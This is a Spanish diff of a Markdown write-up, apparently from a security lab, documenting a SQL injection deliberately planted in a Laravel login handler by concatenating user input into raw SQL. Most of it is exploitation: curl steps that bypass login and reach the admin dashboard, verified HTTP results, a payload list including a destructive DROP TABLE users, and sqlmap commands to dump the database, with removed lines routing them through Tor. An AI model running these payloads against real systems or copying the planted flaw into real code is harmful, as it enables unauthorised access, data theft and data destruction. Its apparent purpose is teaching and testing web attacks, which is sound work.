@@ -1,48 +1,69 @@
 # 02 - SQL Injection
 
-**Responsable:** Keysi
+**Responsable:** Tomi
+**Tipo:** Inyección SQL (A03:2021 - Injection)
 
 ## Archivo modificado
-`app/Http/Requests/Auth/LoginRequest.php`
+`app/Http/Requests/Auth/LoginRequest.php` (línea 36-38)
 
 ## Cambio realizado
-Se reemplazó `Auth::attempt()` por una consulta SQL raw con concatenación directa de strings, permitiendo inyección SQL.
+Se reemplazó el uso seguro de `Auth::attempt()` (que usa Eloquent con consultas parametrizadas) por una consulta SQL raw con concatenación directa de strings del usuario:
 
 ```php
-// 🔥 VULNERABLE - Antes:
-if (! Auth::attempt([$field => $login, 'password' => ...])) {
+// 🔥 VULNERABLE - Antes (seguro):
+if (! Auth::attempt([$field => $login, 'password' => $password])) { ... }
 
-// 🔥 VULNERABLE - Después:
-$sql = "SELECT * FROM users WHERE $field = '$login' LIMIT 1";
-$user = DB::select($sql);
-if (!empty($user)) {
-    Auth::login(User::find($user[0]->id));
+// 🔥 VULNERABLE - Después (SQLi):
+$sql = "SELECT * FROM users WHERE $field = '$login' AND is_active = true LIMIT 1";
+$users = DB::select($sql);
+if (!empty($users)) {
+    Auth::login(User::find($users[0]->id));
 }
 ```
 
 ## Explotación
 
-### Manual con curl (via Tor)
+### Paso 1: Obtener CSRF token
 ```bash
-torsocks curl -X POST "http://192.168.18.31:8001/login" \
-  -d "login=admin' OR '1'='1' --&password=x"
+curl -s -c cookies.txt "http://192.168.18.38:8001/login" | grep -oP 'name="_token" value="\K[^"]+'
 ```
 
-### Con sqlmap (via Tor)
+### Paso 2: Inyectar SQL en el login
 ```bash
-torsocks sqlmap -u "http://192.168.18.31:8001/login" \
-  --data="login=admin&password=test" \
-  --batch --dump
+curl -s -X POST "http://192.168.18.38:8001/login" \
+  -b cookies.txt -c cookies.txt \
+  -d "_token=TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x"
+```
+
+### Paso 3: Verificar acceso admin
+```bash
+curl -b cookies.txt "http://192.168.18.38:8001/admin/dashboard"
+```
+
+## Resultado (verificado)
+```
+SQLi LOGIN: HTTP 302 (redirect a /dashboard)
+ADMIN DASHBOARD: HTTP 200 (acceso concedido)
 ```
 
 ### Payloads útiles
 ```
-admin' OR '1'='1' --
-admin' --
-' OR 1=1 --
-admin' UNION SELECT * FROM users --
+admin' OR '1'='1' --           → Bypass total
+admin' --                       → Comentar resto de consulta
+' OR 1=1 --                     → Inyección universal
+admin' UNION SELECT * FROM users --  → Unión de resultados
+'; DROP TABLE users; --        → Destructivo (no recomendado)
 ```
 
-## Resultado esperado
-- Login exitoso como admin sin conocer la contraseña
-- Acceso total al panel `/admin/dashboard`
+## Con sqlmap
+```bash
+sqlmap -u "http://192.168.18.38:8001/login" \
+  --data="login=admin&password=test" \
+  --batch --level=3 --risk=2 --dump
+```
+
+## Impacto
+- Acceso total como **admin** sin conocer contraseña
+- Visibilidad de todo el panel administrativo
+- Potencial acceso a datos de otros usuarios
+- Posible extracción masiva de la BD con sqlmap
